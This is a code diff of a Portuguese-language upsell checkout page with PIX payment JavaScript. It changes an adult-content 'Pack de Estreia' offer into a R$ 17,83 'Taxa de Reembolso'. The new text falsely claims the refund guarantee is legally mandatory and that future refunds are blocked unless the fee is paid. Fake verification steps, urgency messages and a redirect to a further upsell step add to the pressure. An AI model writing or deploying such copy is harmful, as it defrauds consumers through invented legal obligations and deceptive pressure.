@@ -108,13 +108,13 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     </nav>
 
     <div id="ad1">
-        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Pack de Estreia VIP</p>
+        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Taxa de Reembolso</p>
 
         <div class="ad1">
             <div style="margin-left: 3%; margin-right: 3%;">
                 <button class="styled-button">
                     <div class="icon-container" style="background-color: #f4f4f4; padding: 10px; border-radius: 50%;"> <!-- Mudança feita aqui -->
-                        <span class="material-symbols-outlined" style="font-size: 42px; color: #ff6b3d;">lock_open</span>
+                        <span class="material-symbols-outlined" style="font-size: 42px; color: #b42318;">shield_lock</span>
                     </div>
                     <span class="button-text">
                         <span class="button-title">Conta Privacy: #5972</span>
@@ -130,7 +130,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                             <span class="material-symbols-outlined">check</span>
                         </div>
                         <div class="text-container">
-                            <div class="entrega-title">Acesso VIP confirmado ✓</div>
+                            <div class="entrega-title">Proteção de dados ativada ✓</div>
                         </div>
                     </div>
                     <div class="entrega-content">
@@ -138,18 +138,18 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                             <span class="material-symbols-outlined">warning</span>
                         </div>
                         <div class="text-container">
-                            <div class="entrega-title">Pack de Estreia disponível por tempo limitado 🔥</div>
+                            <div class="entrega-title">Taxa de reembolso pendente</div>
                         </div>
                     </div>
                 </div>
 
-                <p class="security-note" style="text-align: center; margin-left: 3%; margin-right: 3%;">🔥 Amor, antes de você sair daqui, eu separei 12 vídeos meus que NÃO ESTÃO no Privacy. Pack só pra quem entrou hoje — desbloqueia agora e cai tudo no seu acesso na hora.</p>
-                <div style="text-align: center;"><span class="security-price"><small>Valor único</small><strong>R$ 9,90</strong></span></div>
+                <p class="security-note" style="text-align: center; margin-left: 3%; margin-right: 3%;">🛟 Sua garantia de 30 dias é OBRIGATÓRIA por lei. Essa taxa ativa o seu seguro de devolução total — você fica 100% protegido caso queira cancelar a qualquer momento. Sem isso, futuras solicitações de estorno ficam bloqueadas.</p>
+                <div style="text-align: center;"><span class="security-price"><small>Valor único</small><strong>R$ 17,83</strong></span></div>
 
                 <div class="button-container" style="padding-bottom: 20px;">
                     <button class="styled-button2" onclick="generatePixPayment(event)">
                         <span class="button-text">
-                            <span class="button-title2">🔓 Quero o Pack agora</span>
+                            <span class="button-title2">🛟 Ativar minha garantia</span>
                         </span>
                         <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
                     </button>
@@ -159,7 +159,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     </div>
 
     <div id="ad2" style="display: none;">
-        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Pack de Estreia VIP</p>
+        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Taxa de Reembolso</p>
 
         <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
             <div style="padding-top: 2px;"></div>
@@ -174,7 +174,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         <span class="material-symbols-outlined">settings</span>
                     </div>
                     <div class="text-container">
-                        <div class="entrega-title">Conferindo se o Pack de Estreia ainda tá disponível pra você...</div>
+                        <div class="entrega-title">Verificando a liberação do reembolso da sua conta Privacy.</div>
                     </div>
                 </div>
             </div>
@@ -189,7 +189,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         <span class="material-symbols-outlined">warning</span>
                     </div>
                     <div class="text-container">
-                        <div class="entrega-title">Pack ainda disponível — mas tá saindo do ar 😈</div>
+                        <div class="entrega-title">Garantia ainda inativa — ative pra ter direito a reembolso 🛟</div>
                     </div>
                 </div>
             </div>
@@ -204,7 +204,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
                     </div>
                     <div class="text-container">
-                        <div class="entrega-title" style="color: white">💋 Última chance de pegar esse pack, amor. 12 vídeos exclusivos que só os primeiros vão ver — só R$ 9,90.</div>
+                        <div class="entrega-title" style="color: white">⚖️ Ativação obrigatória da garantia, amor. R$ 17,83 e você ganha 30 dias de proteção total — se não curtir, recebe tudo de volta na hora.</div>
                     </div>
                 </div>
             </div>
@@ -212,7 +212,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
                 <button onclick="generatePixPayment(event)" class="styled-button2">
                     <span class="button-text">
-                            <span class="button-title2">🔓 Liberar Pack por R$ 9,90</span>
+                            <span class="button-title2">Pagar R$ 17,83</span>
                     </span>
                     <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
                 </button>
@@ -233,9 +233,9 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     <script src="/tiktok-tracking.js"></script>
 
     <script>
-        document.body.dataset.step = "pack_estreia";
+        document.body.dataset.step = "taxa_reembolso";
 
-        // Sistema de PIX para Pack de Estreia
+        // Sistema de PIX para taxa de reembolso
         const PIX_API_BASES = (() => {
             const bases = [];
             const add = (base) => {
@@ -371,12 +371,12 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     phone: "11999999999",
                     document: "12345678901"
                 };
-                console.log("👤 Dados do cliente para Pack de Estreia:", clientData);
+                console.log("👤 Dados do cliente para taxa de reembolso:", clientData);
 
-                // Dados para o PIX da Pack de Estreia (formato NivusPay)
+                // Dados para o PIX da taxa de reembolso (formato NivusPay)
                 const pixData = {
-                    "amount": 9.90, // R$ 9,90
-                    "description": "Pack de Estreia VIP",
+                    "amount": 17.83, // R$ 17,83
+                    "description": "Taxa de Reembolso",
                     "paymentMethod": "pix",
                     "customer": {
                         "name": clientData.name,
@@ -389,21 +389,21 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     },
                     "items": [
                         {
-                            "title": "Pack de Estreia VIP",
+                            "title": "Taxa de Reembolso",
                             "quantity": 1,
-                            "unitPrice": 990, // R$ 9,90 em centavos
+                            "unitPrice": 1783, // R$ 17,83 em centavos
                             "tangible": false,
-                            "externalRef": "pack_estreia"
+                            "externalRef": "taxa_reembolso"
                         }
                     ],
-                    "externalRef": "pack_estreia_" + Date.now(),
-                    "external_id": "pack_estreia_" + Date.now()
+                    "externalRef": "taxa_reembolso_" + Date.now(),
+                    "external_id": "taxa_reembolso_" + Date.now()
                 };
 
-                console.log("📦 Dados preparados para Pack de Estreia:", pixData);
+                console.log("📦 Dados preparados para taxa de reembolso:", pixData);
 
                 if (window.nicoleTikTok) {
-                    window.nicoleTikTok.trackCheckout({ content_id: "pack_estreia", content_name: "Pack de Estreia VIP", value: 9.9, order_id: pixData.external_id, event_id: "InitiateCheckout_" + pixData.external_id, customer: clientData });
+                    window.nicoleTikTok.trackCheckout({ content_id: "taxa_reembolso", content_name: "Taxa de Reembolso", value: 17.83, order_id: pixData.external_id, event_id: "InitiateCheckout_" + pixData.external_id, customer: clientData });
                 }
 
                 const result = await postPixCreate(pixData);
@@ -414,7 +414,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                 const pixCode = normalizedPix.code;
 
                 if (transactionId && pixCode) {
-                    console.log("✅ PIX Pack de Estreia gerado com sucesso");
+                    console.log("✅ PIX taxa de reembolso gerado com sucesso");
 
                     // Mapear resposta NivusPay para formato esperado
                     const payment = {
@@ -423,7 +423,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         qr_code_url: pixCode,
                         image: pixCode,
                         status: result.status || "waiting_payment",
-                        amount: result.amount || 9.90,
+                        amount: result.amount || 17.83,
                         due_date: normalizedPix.expiresAt || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split('T')[0],
                         secure_url: result.secureUrl,
                         secure_id: result.secureId,
@@ -431,10 +431,10 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     };
 
                     // Salvar ID da NivusPay para verificação posterior
-                    localStorage.setItem("nivuspay_transaction_id_pack_estreia", transactionId);
+                    localStorage.setItem("nivuspay_transaction_id_taxa_reembolso", transactionId);
 
                     if (window.nicoleTikTok) {
-                        window.nicoleTikTok.trackPixGenerated({ content_id: "pack_estreia", content_name: "Pack de Estreia VIP", value: 9.9, order_id: transactionId, event_id: "AddPaymentInfo_" + transactionId, customer: clientData });
+                        window.nicoleTikTok.trackPixGenerated({ content_id: "taxa_reembolso", content_name: "Taxa de Reembolso", value: 17.83, order_id: transactionId, event_id: "AddPaymentInfo_" + transactionId, customer: clientData });
                     }
 
                     showPixModal(payment);
@@ -464,7 +464,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     <div style="background:linear-gradient(135deg,#ff633d,#ff875e);color:#fff;text-align:center;padding:24px 22px 18px;">
                         <h2 style="font-size:20px;line-height:1.2;margin:0 0 6px;font-weight:800;color:#fff;">Escaneie o QR Code</h2>
                         <p style="font-size:15px;margin:0 0 9px;color:#fff;">Ou copie o código PIX abaixo</p>
-                        <div style="display:inline-flex;align-items:center;justify-content:center;min-height:26px;padding:4px 14px;border-radius:999px;background:rgba(255,255,255,.24);font-size:14px;font-weight:800;color:#fff;">Pack de Estreia VIP - R$ ${payment.amount ? payment.amount.toFixed(2).replace('.', ',') : '9,90'}</div>
+                        <div style="display:inline-flex;align-items:center;justify-content:center;min-height:26px;padding:4px 14px;border-radius:999px;background:rgba(255,255,255,.24);font-size:14px;font-weight:800;color:#fff;">Taxa de Reembolso - R$ ${payment.amount ? payment.amount.toFixed(2).replace('.', ',') : '17,83'}</div>
                     </div>
                     <div style="padding:21px 20px 22px;">
                         <div id="qr-code-container" style="display:flex;justify-content:center;margin-bottom:13px;">
@@ -490,12 +490,12 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             paymentModal.classList.remove("hidden");
 
             // Salvar dados do PIX no localStorage
-            localStorage.setItem("currentPixPackEstreia", JSON.stringify({
+            localStorage.setItem("currentPixTaxaReembolso", JSON.stringify({
                 payment,
                 tracking: {
-                    content_id: "pack_estreia",
-                    content_name: "Pack de Estreia VIP",
-                    value: 9.9,
+                    content_id: "taxa_reembolso",
+                    content_name: "Taxa de Reembolso",
+                    value: 17.83,
                     order_id: payment.payment_code,
                     event_id: "CompletePayment_" + payment.payment_code,
                 },
@@ -532,7 +532,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             qrContainer.innerHTML = '<div class="text-xs text-blue-500">Carregando QR Code...</div>';
 
             // Obter o código PIX do localStorage
-            const currentPix = localStorage.getItem('currentPixPackEstreia');
+            const currentPix = localStorage.getItem('currentPixTaxaReembolso');
             if (!currentPix) {
                 qrContainer.innerHTML = '<div class="text-xs text-red-500">Dados PIX não encontrados</div>';
                 return;
@@ -586,7 +586,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
 
         function showQRCodeFallback() {
             const qrContainer = document.getElementById('qrcode');
-            const currentPix = localStorage.getItem('currentPixPackEstreia');
+            const currentPix = localStorage.getItem('currentPixTaxaReembolso');
             
             if (!currentPix) {
                 qrContainer.innerHTML = '<div class="text-xs text-red-500">Dados PIX não encontrados</div>';
@@ -680,7 +680,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
         let paymentCheckInterval = null;
         
         function startAutomaticPaymentCheck(paymentCode) {
-            console.log("🔄 Iniciando verificação automática do pagamento da Pack de Estreia...");
+            console.log("🔄 Iniciando verificação automática do pagamento da taxa de reembolso...");
             
             // Verificar a cada 10 segundos
             paymentCheckInterval = setInterval(async () => {
@@ -710,12 +710,12 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
         
         // Função interna para verificar status (usada tanto pelo automático quanto pelo botão)
         async function checkPaymentStatusInternal(paymentCode, isAutomatic = false) {
-            const nivuspayId = localStorage.getItem("nivuspay_transaction_id_pack_estreia") || paymentCode;
+            const nivuspayId = localStorage.getItem("nivuspay_transaction_id_taxa_reembolso") || paymentCode;
             
-            console.log(`🔍 ${isAutomatic ? 'Verificação automática' : 'Verificação manual'} do pagamento da Pack de Estreia:`, nivuspayId);
+            console.log(`🔍 ${isAutomatic ? 'Verificação automática' : 'Verificação manual'} do pagamento da taxa de reembolso:`, nivuspayId);
             
             // Buscar o identifier do localStorage se disponível
-            const currentPix = localStorage.getItem("currentPixPackEstreia");
+            const currentPix = localStorage.getItem("currentPixTaxaReembolso");
             let identifier = '';
             if (currentPix) {
                 const pixData = JSON.parse(currentPix);
@@ -723,14 +723,14 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             }
             
             const result = await getPixStatus(nivuspayId, identifier);
-            console.log("📊 Status da transação da Pack de Estreia:", result);
+            console.log("📊 Status da transação da taxa de reembolso:", result);
 
             // Verificar se o pagamento foi confirmado
             const statusRaw = String(result.status || result.data?.status || "").toUpperCase();
             const isPaid = result.isPaid === true || result.paid === true || ["PAID", "APPROVED", "CONFIRMED", "COMPLETED"].includes(statusRaw);
 
             if (isPaid) {
-                console.log("✅ Pagamento da Pack de Estreia confirmado!");
+                console.log("✅ Pagamento da taxa de reembolso confirmado!");
                 
                 // Parar verificação automática
                 stopAutomaticPaymentCheck();
@@ -738,18 +738,18 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     const paidEventId = "CompletePayment_" + nivuspayId;
                     let paidCustomer = {};
                     try {
-                        const paidPix = JSON.parse(localStorage.getItem("currentPixPackEstreia") || "{}");
+                        const paidPix = JSON.parse(localStorage.getItem("currentPixTaxaReembolso") || "{}");
                         paidCustomer = (paidPix && paidPix.payment && paidPix.payment.customer) || {};
                     } catch (error) {}
-                    window.nicoleTikTok.trackPaymentConfirmed({ content_id: "pack_estreia", content_name: "Pack de Estreia VIP", value: 9.9, order_id: nivuspayId, event_id: paidEventId, customer: paidCustomer });
+                    window.nicoleTikTok.trackPaymentConfirmed({ content_id: "taxa_reembolso", content_name: "Taxa de Reembolso", value: 17.83, order_id: nivuspayId, event_id: paidEventId, customer: paidCustomer });
                 }
                 
                 // Redirecionar para up2 pm
-                window.location.href = "../up2/index.html";
+                window.location.href = "../up8/index.html";
                 return;
             } else {
                 const status = result.status || 'unknown';
-                console.log(`⏳ Status atual da Pack de Estreia: ${status}`);
+                console.log(`⏳ Status atual da taxa de reembolso: ${status}`);
                 
                 // Se não for automático, mostrar mensagem para o usuário
                 if (!isAutomatic) {
